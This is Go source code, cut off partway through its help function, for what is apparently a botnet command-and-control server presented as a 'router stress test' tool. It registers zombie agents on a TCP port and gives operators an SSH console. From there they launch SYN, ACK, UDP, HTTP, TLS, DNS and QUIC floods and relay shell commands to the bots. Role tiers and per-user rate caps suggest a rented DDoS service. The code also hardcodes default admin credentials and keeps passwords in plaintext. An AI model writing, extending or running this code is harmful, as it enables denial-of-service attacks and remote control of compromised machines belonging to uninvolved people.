package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	//"crypto/x509"
	"encoding/json"
	//"encoding/pem"
	"fmt"
	"io"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"encoding/binary"
	"bytes"

	"github.com/fatih/color"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/crypto/ssh"
	"net"
)

// ========================= 全局常量 =========================
const (
	VERSION             = "5.6"
	CONTROL_PORT        = 9999
	SSH_PORT            = 22222 // 改为SSH端口
	MAX_CONNECTIONS     = 100000
	MAX_USER_CONNECTIONS = 1000
	STATS_INTERVAL      = 5
	HEARTBEAT_INTERVAL  = 30
	CONFIG_FILE         = "controller_config.json"
	USER_FILE           = "user.txt"
	LOG_FILE            = "controller.log"
	PID_FILE            = "/var/run/stress_controller.pid"
	MAX_PACKET_SIZE     = 1400
	MIN_PACKET_SIZE     = 0
	USER_MAX_RATE        = 10000   // 最大速率(Packets Per Second)
    USER_MAX_THREADS     = 1    // 最大线程数
    USER_MAX_CONCURRENT  = 1000   // 最大并发连接数
	AUTH_KEY            = "#KEY#1234567890#" // 新增：身份验证密钥，必须与僵尸节点配置一致
)

// ========================= 全局变量 =========================
var (
	controller     *Controller
	stats          *Statistics
	config         *Config
	logger         *zap.Logger
	startTime      = time.Now()
	connectionCount = atomic.Uint64{}
	userCount      = atomic.Uint64{}
	commandCount   = atomic.Uint64{}
	shutdownSignal = make(chan os.Signal, 1)
	isShuttingDown = atomic.Bool{}
	users          = make(map[string]*User)
	userMutex      = sync.RWMutex{}
	sshConfig      *ssh.ServerConfig
)

// 颜色定义
var (
	red     = color.New(color.FgRed, color.Bold)
	green   = color.New(color.FgGreen, color.Bold)
	yellow  = color.New(color.FgYellow, color.Bold)
	cyan    = color.New(color.FgCyan, color.Bold)
	magenta = color.New(color.FgMagenta, color.Bold)
	blue    = color.New(color.FgBlue, color.Bold)
	white   = color.New(color.FgWhite, color.Bold)
)

// ========================= 数据结构 =========================
type AttackMode int

const (
	ModeSYN AttackMode = iota
	ModeACK
	ModeTCP
	ModeTCP_CONN // 新增：TCP长连接模式
	ModeUDP      // 新增：UDP Flood 模式
	ModeHTTP
	ModeTLS
	ModeDNS  // 新增：DNS查询攻击模式
	ModeQUIC // 新增：QUIC协议攻击模式
	ModeShell
)

func (m AttackMode) String() string {
	return []string{"SYN Flood", "ACK Flood", "TCP Flood", "TCP Connection Flood", "UDP Flood", "HTTP GET Flood", "TLS Handshake", "DNS Query", "QUIC", "Shell Command"}[m]
}

func (m AttackMode) Short() string {
	return []string{"syn", "ack", "tcp", "tcp_conn", "udp", "http", "tls", "dns", "quic", "shell"}[m]
}

type AgentStatus int

const (
	StatusConnected AgentStatus = iota
	StatusTesting
	StatusDisconnected
	StatusError
)

func (s AgentStatus) String() string {
	return []string{"已连接", "测试中", "已断开", "错误"}[s]
}

// 用户权限级别
type UserRole int

const (
	RoleGuest UserRole = iota
	RoleUser
	RoleAdmin
)

func (r UserRole) String() string {
	return []string{"游客", "普通用户", "管理员"}[r]
}

// 用户结构
type User struct {
	Username    string
	Password    string
	Role        UserRole
	LastLogin   time.Time
	LoginCount  int
	IsLoggedIn  bool
	CurrentConn net.Conn
	LastAttack  time.Time
	InCooldown  bool
	CooldownEnd time.Time
	mu          sync.RWMutex
}

// 用户会话 - 修改为支持SSH
type UserSession struct {
	User       *User
	Channel    ssh.Channel
	Session    *ssh.Session
	RemoteAddr string
	LoginTime  time.Time
	LastActive time.Time
	mu         sync.RWMutex
	reader     *bufio.Reader
	writer     io.Writer
}

// 连接信息
type Connection struct {
	ID         string
	Conn       net.Conn
	RemoteAddr string
	Hostname   string
	Version    string
	Status     AgentStatus
	LastSeen   time.Time
	ConnectedAt time.Time
	mu         sync.RWMutex
}

// 压力测试参数
type AttackParams struct {
	Mode             AttackMode
	TargetIP         string
	TargetPort       int
	PacketsPerSecond int
	Duration         int
	Threads          int
	PacketSize       int
	ConcurrentConns  int
	Hostname         string
	Path             string
	ShellCommand     string
}

// 攻击任务
type AttackTask struct {
	ID         string
	Params     AttackParams
	StartTime  time.Time
	EndTime    time.Time
	Agents     []string
	Status     string
	TotalSent  uint64
	CreatedBy  string
}

// 统计信息
type Statistics struct {
	TotalConnections  uint64
	ActiveConnections uint64
	TestingConnections uint64
	TotalCommands     uint64
	StartTime         time.Time
	Uptime            time.Duration
	CurrentAttack     *AttackTask
	mu                sync.RWMutex
}

// 控制器配置
type Config struct {
	ServerIP         string   `json:"server_ip"`
	ServerPort       int      `json:"server_port"`
	SSHPort          int      `json:"ssh_port"`
	WorkerThreads    int      `json:"worker_threads"`
	MaxConnections   int      `json:"max_connections"`
	MaxUserConnections int    `json:"max_user_connections"`
	HeartbeatTimeout int      `json:"heartbeat_timeout"`
	LogLevel         string   `json:"log_level"`
	LogFile          string   `json:"log_file"`
	UserFile         string   `json:"user_file"`
	PidFile          string   `json:"pid_file"`
	DefaultThreads   int      `json:"default_threads"`
	DefaultRate      int      `json:"default_rate"`
	DefaultDuration  int      `json:"default_duration"`
	DefaultPacketSize int     `json:"default_packet_size"`
	BlockedIPs       []string `json:"blocked_ips"`
	AllowedIPs       []string `json:"allowed_ips"`
}

// 控制器
type Controller struct {
	connections   sync.Map
	userSessions  sync.Map
	tasks         sync.Map
	currentTask   *AttackTask
	broadcastChan chan *BroadcastMessage
	listener      net.Listener
	sshListener   net.Listener
	running       atomic.Bool
	shuttingDown  atomic.Bool
	stats         *Statistics
	config        *Config
	mu            sync.RWMutex
	heartbeatTicker *time.Ticker
	statsTicker   *time.Ticker
	cleanupTicker *time.Ticker
	userCleanupTicker *time.Ticker
	// 新增：用户配置重载定时器
    userReloadTicker *time.Ticker
}

// 广播消息
type BroadcastMessage struct {
	Command   string
	Targets   []string
	Timestamp time.Time
}

// ========================= 初始化 =========================
func init() {
    // 加载配置
    config = loadConfig()
    
    // 初始化日志
    logger = initLogger()
    
    // 创建PID文件
    createPidFile()
    
    // 初始化SSH配置
    initSSHConfig()
    
    // 初始化控制器
    controller = &Controller{
        broadcastChan: make(chan *BroadcastMessage, 10000),
        stats: &Statistics{
            StartTime: time.Now(),
        },
        config: config,
    }
    
    stats = controller.stats
    
    // 设置信号处理
    signal.Notify(shutdownSignal, syscall.SIGINT, syscall.SIGTERM, syscall.SIGHUP)
    
    // 注意：这里不再调用 loadUsers()，由定时任务负责加载
}

// ========================= 日志系统 =========================
func initLogger() *zap.Logger {
	var level zapcore.Level
	switch strings.ToLower(config.LogLevel) {
	case "debug":
		level = zap.DebugLevel
	case "info":
		level = zap.InfoLevel
	case "warn":
		level = zap.WarnLevel
	case "error":
		level = zap.ErrorLevel
	default:
		level = zap.InfoLevel
	}
	
	encoderConfig := zapcore.EncoderConfig{
		TimeKey:        "time",
		LevelKey:       "level",
		NameKey:        "logger",
		CallerKey:      "caller",
		MessageKey:     "msg",
		StacktraceKey:  "stacktrace",
		LineEnding:     zapcore.DefaultLineEnding,
		EncodeLevel:    zapcore.LowercaseLevelEncoder,
		EncodeTime:     zapcore.ISO8601TimeEncoder,
		EncodeDuration: zapcore.SecondsDurationEncoder,
		EncodeCaller:   zapcore.ShortCallerEncoder,
	}
	
	fileEncoder := zapcore.NewJSONEncoder(encoderConfig)
	logFile, err := os.OpenFile(config.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logFile = os.Stdout
	}
	fileWriter := zapcore.Lock(zapcore.AddSync(logFile))
	
	core := zapcore.NewTee(
		zapcore.NewCore(fileEncoder, fileWriter, level),
	)
	
	return zap.New(core, zap.AddCaller(), zap.AddStacktrace(zap.ErrorLevel))
}

func initSSHConfig() error {
    privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
    if err != nil {
        return fmt.Errorf("生成RSA密钥失败: %v", err)
    }
    
    signer, err := ssh.NewSignerFromKey(privateKey)
    if err != nil {
        return fmt.Errorf("创建签名器失败: %v", err)
    }
    
    sshConfig = &ssh.ServerConfig{
        PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
            username := conn.User()
            passwordStr := string(password)
            
            user, authenticated := authenticate(username, passwordStr)
            if !authenticated {
                logger.Info("SSH认证失败", 
                    zap.String("username", username),
                    zap.String("remote", conn.RemoteAddr().String()))
                return nil, fmt.Errorf("认证失败")
            }
            
            logger.Info("SSH认证成功", 
                zap.String("username", username),
                zap.String("remote", conn.RemoteAddr().String()))
            
            return &ssh.Permissions{
                Extensions: map[string]string{
                    "username": username,
                    "role":     strconv.Itoa(int(user.Role)),
                },
            }, nil
        },
    }
    
    sshConfig.AddHostKey(signer)
    return nil
}

// ========================= 配置管理 =========================
func loadConfig() *Config {
	cfg := &Config{
		ServerIP:         "0.0.0.0",
		ServerPort:       CONTROL_PORT,
		SSHPort:         SSH_PORT,
		WorkerThreads:    8,
		MaxConnections:   MAX_CONNECTIONS,
		MaxUserConnections: MAX_USER_CONNECTIONS,
		HeartbeatTimeout: 60,
		LogLevel:         "info",
		LogFile:          LOG_FILE,
		UserFile:         USER_FILE,
		PidFile:          PID_FILE,
		DefaultThreads:   10,
		DefaultRate:      1000,
		DefaultDuration:  60,
		DefaultPacketSize: 0,
	}
	
	// 尝试从配置文件加载
	if data, err := os.ReadFile(CONFIG_FILE); err == nil {
		json.Unmarshal(data, cfg)
	}
	
	return cfg
}

// ========================= 用户管理 =========================
func loadUsers() {
	data, err := os.ReadFile(config.UserFile)
	if err != nil {
		logger.Error("无法加载用户文件，创建默认用户", zap.Error(err))
		createDefaultUsers()
		return
	}
	
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		
		parts := strings.Split(line, ":")
		if len(parts) < 3 {
			continue
		}
		
		username := strings.TrimSpace(parts[0])
		password := strings.TrimSpace(parts[1])
		roleStr := strings.TrimSpace(parts[2])
		
		var role UserRole
		switch roleStr {
		case "admin":
			role = RoleAdmin
		case "user":
			role = RoleUser
		default:
			role = RoleGuest
		}
		
		userMutex.Lock()
		users[username] = &User{
			Username:   username,
			Password:   password,
			Role:       role,
			LastLogin:  time.Time{},
			LoginCount: 0,
			IsLoggedIn: false,
		}
		userMutex.Unlock()
	}
	
	logger.Info("用户加载完成", zap.Int("count", len(users)))
}

func createDefaultUsers() {
	defaultUsers := []string{
		"admin:admin123:admin",
		"user:user123:user",
	}
	
	data := strings.Join(defaultUsers, "\n")
	if err := os.WriteFile(config.UserFile, []byte(data), 0644); err != nil {
		logger.Error("创建默认用户文件失败", zap.Error(err))
		return
	}
	
	// 重新加载
	loadUsers()
}

func authenticate(username, password string) (*User, bool) {
	userMutex.RLock()
	user, exists := users[username]
	userMutex.RUnlock()
	
	if !exists {
		return nil, false
	}
	
	if user.Password != password {
		return nil, false
	}
	
	return user, true
}

func (c *Controller) logoutUser(session *UserSession) {
    if session == nil {
        return
    }
    
    // 添加会话锁，防止并发注销
    session.mu.Lock()
    defer session.mu.Unlock()
    
    // 检查是否已经注销
    if session.User == nil {
        return
    }
    
    username := session.User.Username
    
    // 检查是否已经注销
    session.User.mu.RLock()
    alreadyLoggedOut := !session.User.IsLoggedIn
    session.User.mu.RUnlock()
    
    if alreadyLoggedOut {
        logger.Debug("用户已注销，跳过重复操作", zap.String("username", username))
        return
    }
    
    // 更新全局用户状态
    userMutex.Lock()
    if globalUser, exists := users[username]; exists {
        globalUser.mu.Lock()
        globalUser.IsLoggedIn = false
        globalUser.CurrentConn = nil
        globalUser.mu.Unlock()
        logger.Debug("更新全局用户状态", 
            zap.String("username", username),
            zap.Bool("isLoggedIn", false))
    }
    userMutex.Unlock()
    
    // 更新会话中的用户状态
    session.User.mu.Lock()
    session.User.IsLoggedIn = false
    session.User.CurrentConn = nil
    session.User.mu.Unlock()
    
    // 关闭通道
    if session.Channel != nil {
        session.Channel.Close()
    }
    
    // 从会话映射中删除
    c.userSessions.Delete(session.RemoteAddr)
    userCount.Add(^uint64(0))
    
    logger.Info("用户注销完成", 
        zap.String("remote", session.RemoteAddr),
        zap.String("username", username))
}

// ========================= PID文件管理 =========================
func createPidFile() {
	pid := os.Getpid()
	data := []byte(strconv.Itoa(pid) + "\n")
	
	if err := os.WriteFile(PID_FILE, data, 0644); err != nil {
		logger.Error("创建PID文件失败", zap.Error(err))
	}
}

func removePidFile() {
	if err := os.Remove(PID_FILE); err != nil {
		logger.Error("删除PID文件失败", zap.Error(err))
	}
}

// ========================= 连接管理 =========================
func (c *Controller) addConnection(conn net.Conn) *Connection {
	remoteAddr := conn.RemoteAddr().String()
	
	connection := &Connection{
		ID:         generateID(),
		Conn:       conn,
		RemoteAddr: remoteAddr,
		Status:     StatusConnected,
		ConnectedAt: time.Now(),
		LastSeen:   time.Now(),
		Hostname:   fmt.Sprintf("agent-%s", generateID()[:8]),
		Version:    "unknown",
	}
	
	c.connections.Store(connection.ID, connection)
	
	connectionCount.Add(1)
	stats.mu.Lock()
	stats.TotalConnections++
	stats.ActiveConnections++
	stats.mu.Unlock()
	
	logger.Debug("新连接加入",
		zap.String("id", connection.ID),
		zap.String("remote", remoteAddr))
	
	return connection
}

func (c *Controller) removeConnection(id string) {
	if conn, loaded := c.connections.LoadAndDelete(id); loaded {
		connection := conn.(*Connection)
		connection.Conn.Close()
		
		connectionCount.Add(^uint64(0))
		stats.mu.Lock()
		stats.ActiveConnections--
		if connection.Status == StatusTesting {
			stats.TestingConnections--
		}
		stats.mu.Unlock()
		
		logger.Debug("连接移除", zap.String("id", id))
	}
}

func (c *Controller) getConnection(id string) (*Connection, bool) {
	if conn, ok := c.connections.Load(id); ok {
		return conn.(*Connection), true
	}
	return nil, false
}

func (c *Controller) getConnections(count int) []*Connection {
	var connections []*Connection
	
	c.connections.Range(func(key, value interface{}) bool {
		conn := value.(*Connection)
		connections = append(connections, conn)
		
		if count > 0 && len(connections) >= count {
			return false
		}
		return true
	})
	
	return connections
}

func (c *Controller) updateConnectionStatus(id string, status AgentStatus) {
	if conn, ok := c.getConnection(id); ok {
		conn.mu.Lock()
		oldStatus := conn.Status
		conn.Status = status
		conn.mu.Unlock()
		
		if oldStatus != status && status == StatusTesting {
			stats.mu.Lock()
			stats.TestingConnections++
			stats.mu.Unlock()
		} else if oldStatus == StatusTesting && status != StatusTesting {
			stats.mu.Lock()
			if stats.TestingConnections > 0 {
				stats.TestingConnections--
			}
			stats.mu.Unlock()
		}
	}
}

// ========================= 网络处理 =========================
func (c *Controller) startListeners() error {
	// 启动僵尸监听器
	agentAddr := fmt.Sprintf("%s:%d", config.ServerIP, config.ServerPort)
	agentListener, err := net.Listen("tcp", agentAddr)
	if err != nil {
		return fmt.Errorf("启动僵尸监听失败: %v", err)
	}
	c.listener = agentListener
	
	// 启动SSH监听器
	sshAddr := fmt.Sprintf("%s:%d", config.ServerIP, config.SSHPort)
	sshListener, err := net.Listen("tcp", sshAddr)
	if err != nil {
		agentListener.Close()
		return fmt.Errorf("启动SSH监听失败: %v", err)
	}
	c.sshListener = sshListener
	
	c.running.Store(true)
	
	//cyan.Printf("\n🚀 路由器压力测试控制端 v%s\n", VERSION)
	//cyan.Printf("📡 僵尸监听地址: %s\n", agentAddr)
	//cyan.Printf("🔐 SSH登录地址: %s:%d\n", config.ServerIP, config.SSHPort)
	cyan.Printf("最大僵尸连接数: %d\n", config.MaxConnections)
	cyan.Printf("启动时间: %s\n\n", time.Now().Format("2006-01-02 15:04:05"))
	
	// 启动僵尸接收工作线程
	for i := 0; i < config.WorkerThreads; i++ {
		go c.acceptAgentWorker(i)
	}
	
	// 启动SSH接收工作线程
	go c.acceptSSHWorker()
	
	// 启动广播工作者
	go c.broadcastWorker()
	
	// 启动定时器
	c.startTimers()
	
	return nil
}

func (c *Controller) acceptAgentWorker(id int) {
	for c.running.Load() {
		conn, err := c.listener.Accept()
		if err != nil {
			if !c.shuttingDown.Load() {
				logger.Error("接受僵尸连接失败", zap.Error(err))
			}
			continue
		}
		
		// 检查连接数限制
		if connectionCount.Load() >= uint64(config.MaxConnections) {
			conn.Close()
			continue
		}
		
		// IP过滤
		remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
		if c.isIPBlocked(remoteIP) {
			conn.Close()
			continue
		}
		
		// 后台处理连接
		go c.handleAgentConnection(conn)
	}
}

func (c *Controller) acceptSSHWorker() {
	for c.running.Load() {
		conn, err := c.sshListener.Accept()
		if err != nil {
			if !c.shuttingDown.Load() {
				logger.Error("接受SSH连接失败", zap.Error(err))
			}
			continue
		}
		
		// 检查用户连接数限制
		if userCount.Load() >= uint64(config.MaxUserConnections) {
			conn.Write([]byte("错误: 用户连接数已达上限\r\n"))
			conn.Close()
			continue
		}
		
		// 后台处理SSH连接
		go c.handleSSHConnection(conn)
	}
}

func (c *Controller) handleAgentConnection(conn net.Conn) {
	// 设置初始读取超时，用于身份验证阶段
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	defer conn.SetReadDeadline(time.Time{}) // 处理完成后重置超时

	// ========== 新增：身份验证流程 ==========
	reader := bufio.NewReader(conn)
	
	// 1. 等待并读取客户端发送的 "hello" 请求
	helloLine, err := reader.ReadString('\n')
	if err != nil {
		logger.Debug("读取hello请求失败或超时", zap.String("remote", conn.RemoteAddr().String()), zap.Error(err))
		conn.Close()
		return
	}
	
	// 清理换行符并验证消息内容
	helloLine = strings.TrimSpace(helloLine)
	if helloLine != "hello" {
		logger.Debug("无效的身份验证请求", zap.String("remote", conn.RemoteAddr().String()), zap.String("received", helloLine))
		conn.Close()
		return
	}
	
	logger.Debug("收到hello请求", zap.String("remote", conn.RemoteAddr().String()))
	
	// 2. 向客户端返回身份验证密钥
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Write([]byte(AUTH_KEY + "\n"))
	if err != nil {
		logger.Debug("发送验证密钥失败", zap.String("remote", conn.RemoteAddr().String()), zap.Error(err))
		conn.Close()
		return
	}
	
	logger.Debug("已发送验证密钥", zap.String("remote", conn.RemoteAddr().String()), zap.String("key", AUTH_KEY))
	// ========== 身份验证流程结束 ==========
	
	// 验证通过，将连接添加到管理列表
	connection := c.addConnection(conn)
	
	// 设置后续通信的心跳超时
	conn.SetReadDeadline(time.Now().Add(time.Duration(config.HeartbeatTimeout) * time.Second))
	
	// 继续原有的消息处理循环
	for c.running.Load() {
		conn.SetReadDeadline(time.Now().Add(time.Duration(config.HeartbeatTimeout) * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		
		line = strings.TrimSpace(line)
		connection.LastSeen = time.Now()
		
		// 处理消息
		if strings.HasPrefix(line, "AGENT ") {
			// 僵尸认证信息
			parts := strings.Split(line, " ")
			if len(parts) >= 2 {
				connection.Hostname = parts[1]
			}
			for _, part := range parts[2:] {
				if strings.HasPrefix(part, "v") {
					connection.Version = part
				}
			}
			
			// 发送欢迎消息
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write([]byte("WELCOME " + connection.ID + "\n"))
			
			logger.Info("僵尸节点验证并注册成功",
				zap.String("id", connection.ID),
				zap.String("remote", connection.RemoteAddr),
				zap.String("hostname", connection.Hostname),
				zap.String("version", connection.Version))
		} else if line == "PING" {
			// 心跳响应
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write([]byte("PONG\n"))
		} else {
			logger.Debug("收到未知消息", zap.String("id", connection.ID), zap.String("msg", line))
		}
	}
	
	// 清理连接
	c.removeConnection(connection.ID)
}

func (c *Controller) handleSSHConnection(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	
	// 升级到SSH连接
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, sshConfig)
	if err != nil {
		logger.Error("SSH握手失败", zap.Error(err))
		conn.Close()
		return
	}
	
	// 处理全局请求
	go ssh.DiscardRequests(reqs)
	
	// 处理新通道
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "未知通道类型")
			continue
		}
		
		channel, requests, err := newChannel.Accept()
		if err != nil {
			logger.Error("接受SSH通道失败", zap.Error(err))
			continue
		}
		
		// 从SSH连接中获取用户名
		username := sshConn.Permissions.Extensions["username"]
		//roleStr := sshConn.Permissions.Extensions["role"]
		
		if username == "" {
			channel.Write([]byte("认证信息丢失\r\n"))
			channel.Close()
			continue
		}
		
		// 获取用户对象
		userMutex.RLock()
		user, exists := users[username]
		userMutex.RUnlock()
		
		if !exists {
			channel.Write([]byte("用户不存在\r\n"))
			channel.Close()
			continue
		}
		
		// 严格的单一会话检查：如果用户已登录，立即拒绝新会话。
		user.mu.RLock()
		isLoggedIn := user.IsLoggedIn
		user.mu.RUnlock()

		if isLoggedIn {
			// 用户已在线，拒绝此次登录
			channel.Write([]byte("错误：该账号已在别处登录。每个账号只允许一个活跃会话。\r\n"))
			logger.Info("拒绝重复登录", 
				zap.String("username", username),
				zap.String("remote", remoteAddr))
			channel.Close()
			continue
		}
		
		// 更新用户状态
		user.mu.Lock()
		user.LastLogin = time.Now()
		user.LoginCount++
		user.IsLoggedIn = true
		user.CurrentConn = conn
		user.mu.Unlock()
		
		// 创建用户会话
		session := &UserSession{
			User:       user,
			Channel:    channel,
			RemoteAddr: remoteAddr,
			LoginTime:  time.Now(),
			LastActive: time.Now(),
			reader:     bufio.NewReader(channel),
			writer:     channel,
		}
		
		c.userSessions.Store(remoteAddr, session)
		userCount.Add(1)
		
		// 处理SSH会话请求
		go c.handleSSHSession(session, channel, requests)
	}
}

func (c *Controller) handleSSHSession(session *UserSession, channel ssh.Channel, requests <-chan *ssh.Request) {
    defer func() {
        if r := recover(); r != nil {
            logger.Error("处理SSH会话时发生panic", zap.Any("recover", r))
        }
        c.logoutUser(session)
    }()
    
    // 标志变量
    //ptyRequested := false
    var term string
    var width, height int
    
    // 处理SSH请求
    for req := range requests {
        logger.Debug("收到SSH请求", zap.String("type", req.Type), zap.Bool("want_reply", req.WantReply))
        
        switch req.Type {
        case "pty-req":
            // 解析PTY请求参数
            if len(req.Payload) >= 8 {
                termBytes := req.Payload[4:]
                termEnd := bytes.IndexByte(termBytes, 0)
                if termEnd > 0 {
                    term = string(termBytes[:termEnd])
                }
                if len(req.Payload) >= 13 {
                    width = int(binary.BigEndian.Uint32(req.Payload[termEnd+5:]))
                    height = int(binary.BigEndian.Uint32(req.Payload[termEnd+9:]))
                }
            }
            //ptyRequested = true
            req.Reply(true, nil)
            logger.Debug("处理PTY请求", zap.String("term", term), 
                zap.Int("width", width), zap.Int("height", height))
            
        case "window-change":
            // 处理窗口大小变化
            if len(req.Payload) >= 8 {
                width = int(binary.BigEndian.Uint32(req.Payload))
                height = int(binary.BigEndian.Uint32(req.Payload[4:]))
            }
            req.Reply(true, nil)
            
        case "shell":
            req.Reply(true, nil)
            
            // 发送欢迎消息（确保UTF-8编码）
			welcome := fmt.Sprintf("\r\n\r\n%s v%s\r\n", 
				cyan.Sprint("路由器压力测试控制端"), VERSION)
			welcome += fmt.Sprintf("欢迎 %s [%s]\r\n", 
				green.Sprint(session.User.Username), yellow.Sprint(session.User.Role.String()))
			welcome += fmt.Sprintf("输入 '%s' 查看可用命令\r\n\r\n", 
				blue.Sprint("help"))

			channel.Write([]byte(welcome))
            
            // 进入命令循环
            c.sshCommandLoop(session)
            return
            
        default:
            logger.Debug("未知请求类型", zap.String("type", req.Type))
            req.Reply(false, nil)
        }
    }
}

func (c *Controller) sshCommandLoop(session *UserSession) {
    logger.Info("进入SSH命令循环", zap.String("user", session.User.Username))
    
	// 添加标志防止重复注销
    var logoutCalled bool
    
    defer func() {
        if r := recover(); r != nil {
            logger.Error("SSH命令循环发生panic", 
                zap.Any("recover", r),
                zap.String("user", session.User.Username))
        }
        
        // 只在未注销的情况下调用logoutUser
        if !logoutCalled && session != nil && session.User != nil && session.User.IsLoggedIn {
            logoutCalled = true
            logger.Info("安全退出SSH命令循环，执行注销", 
                zap.String("user", session.User.Username))
            c.logoutUser(session)
        }
        
        logger.Info("退出SSH命令循环", zap.String("user", session.User.Username))
    }()
	
    // 创建读取缓冲区
    reader := bufio.NewReader(session.Channel)
    
    for c.running.Load() {
        // 显示提示符
		prompt := fmt.Sprintf("[%s%s%s] > ", 
			green.Sprint(session.User.Username), 
			white.Sprint("@"), 
			cyan.Sprint("stress"))
		if _, err := session.Channel.Write([]byte(prompt)); err != nil {
			logger.Error("写入提示符失败", zap.Error(err))
			break
		}
        
        // 使用带超时的读取
		readTimeout := 600 * time.Second
		line, err := c.readLineWithTimeout(reader, session.Channel, readTimeout)
		if err != nil {
			if err == io.EOF {
				logger.Info("客户端主动断开连接", zap.String("user", session.User.Username))
				break // 客户端断开，退出循环
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// 重点是这里：读取超时是一种网络超时错误
				// 不打印干扰信息，不break，直接continue，安静地开始下一次读取。
				// 这样用户不会看到频繁的提示，连接也保持活跃。
				// 可以选择性地记录一条Debug日志。
				logger.Debug("SSH读取超时，重置读取状态", 
					zap.String("user", session.User.Username), 
					zap.Duration("timeout", readTimeout))
				continue
			} else {
				// 其他错误，如连接被重置等，视为断开
				logger.Error("读取SSH输入时发生非预期错误", zap.String("user", session.User.Username), zap.Error(err))
				break
			}
		}
        
        // 处理空行
        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }
        
        // 更新活动时间
        session.mu.Lock()
        session.LastActive = time.Now()
        session.mu.Unlock()
        
        // 处理命令
        c.handleUserCommand(line, session)
    }
    
    logger.Info("退出SSH命令循环", zap.String("user", session.User.Username))
}

// 带超时的读取函数
func (c *Controller) readLineWithTimeout(reader *bufio.Reader, channel ssh.Channel, timeout time.Duration) (string, error) {
    // 使用通道来处理结果
    resultChan := make(chan string, 1)
    errorChan := make(chan error, 1)
    
    go func() {
        var buffer []byte
        for {
            // 尝试读取一个字节
            b, err := reader.ReadByte()
            if err != nil {
                errorChan <- err
                return
            }
            
            // 回显字符（除了控制字符）
            if b >= 32 && b <= 126 { // 可打印字符
                channel.Write([]byte{b})
            }
            
            // 回车或换行结束输入
            if b == '\r' || b == '\n' {
                channel.Write([]byte("\r\n"))
                if len(buffer) > 0 {
                    resultChan <- string(buffer)
                    return
                }
                continue
            }
            
            // 处理退格键
            if b == 0x7f || b == 0x08 { // 退格或删除
                if len(buffer) > 0 {
                    buffer = buffer[:len(buffer)-1]
                    // 发送退格控制序列
                    channel.Write([]byte{0x08, ' ', 0x08})
                }
                continue
            }
            
            // 添加到缓冲区
            if b >= 32 && b <= 126 { // 只添加可打印字符
                buffer = append(buffer, b)
            }
        }
    }()
    
    select {
    case line := <-resultChan:
        return line, nil
    case err := <-errorChan:
        return "", err
    case <-time.After(timeout):
        return "", fmt.Errorf("读取超时")
    }
}

// ========================= 用户命令处理 =========================
func (c *Controller) handleUserCommand(input string, session *UserSession) {
	if session.User == nil {
		return
	}
	
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}
	
	command := parts[0]
	args := parts[1:]
	
	// 检查权限
	if !c.checkPermission(session.User, command) {
		session.Channel.Write([]byte("权限不足，您没有执行此命令的权限\r\n"))
		return
	}
	
	switch command {
	case "help", "?":
		c.sendUserHelp(session)
	case "stats":
		c.sendUserStats(session)
	case "attack":
		c.handleUserAttack(args, session)
	case "stop":
		c.handleUserStop(args, session)
	case "shell":
		c.handleUserShell(args, session)
	case "logout":
		session.Channel.Write([]byte("再见！\r\n"))
		c.logoutUser(session)
		return
	case "quit", "exit":
		session.Channel.Write([]byte("正在关闭连接...\r\n"))
		c.logoutUser(session)
		return
	default:
		session.Channel.Write([]byte("未知命令: " + command + "\r\n"))
	}
}

// ========================= 新增：攻击参数权限检查 =========================
func (c *Controller) canUserUseAttackParams(user *User, params AttackParams) (bool, string) {
    // 管理员无限制
    if user.Role == RoleAdmin {
        return true, ""
    }

    // 普通用户检查速率限制
    if params.PacketsPerSecond > USER_MAX_RATE {
        return false, fmt.Sprintf("速率(%d pps)超出普通用户限制(%d pps)", params.PacketsPerSecond, USER_MAX_RATE)
    }

    // 普通用户检查线程数限制
    if params.Threads > USER_MAX_THREADS {
        return false, fmt.Sprintf("线程数(%d)超出普通用户限制(%d)", params.Threads, USER_MAX_THREADS)
    }

    // 普通用户检查并发连接数限制 (HTTP/TLS/QUIC等模式使用)
    if params.ConcurrentConns > USER_MAX_CONCURRENT {
        return false, fmt.Sprintf("并发连接数(%d)超出普通用户限制(%d)", params.ConcurrentConns, USER_MAX_CONCURRENT)
    }

    return true, ""
}

func (c *Controller) checkPermission(user *User, command string) bool {
	// 管理员拥有所有权限
	if user.Role == RoleAdmin {
		return true
	}
	
	// 普通用户权限
	if user.Role == RoleUser {
		allowedCommands := map[string]bool{
			"help":   true,
			"stats":  true,
			"attack": true,
			"logout": true,
			"quit":   true,
			"exit":   true,
		}
		
		return allowedCommands[command]
	}
	
	// 游客（如果有）无权限
	return false
}

func (c *Controller) sendUserHelp(session *UserSession) {
	helpText := fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("========== 路由器压力测试控制端帮助 =========="))
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		white.Add(color.Bold).Sprint("📋 可用命令"))
	helpText += fmt.Sprintf("  %s                    %s\r\n", 
		green.Add(color.Bold).Sprint("help"), white.Sprint("显示此帮助信息"))
	helpText += fmt.Sprintf("  %s                   %s\r\n", 
		green.Add(color.Bold).Sprint("stats"), white.Sprint("显示系统统计信息（节点状态、当前任务等）"))
	helpText += fmt.Sprintf("  %s %s         %s\r\n", 
		green.Add(color.Bold).Sprint("attack"), yellow.Sprint("<params>"), white.Sprint("发起压力测试攻击"))
